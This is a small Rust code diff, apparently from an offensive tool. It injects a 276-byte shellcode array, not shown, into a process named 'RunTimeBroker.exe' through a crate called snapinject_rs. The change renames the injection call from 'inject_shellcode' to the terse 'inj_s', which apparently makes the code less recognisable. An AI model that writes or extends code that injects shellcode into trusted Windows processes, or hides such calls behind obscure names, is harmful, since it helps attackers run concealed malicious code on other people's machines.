@@ -30,5 +30,5 @@ pub const SHELL_CODE: [u8; 276] = [
 fn main() {
     let process_name = "RunTimeBroker.exe".to_string();
 
-    snapinject_rs::inject_shellcode(&process_name, &SHELL_CODE).unwrap();
+    snapinject_rs::inj_s(&process_name, &SHELL_CODE).unwrap();
 }
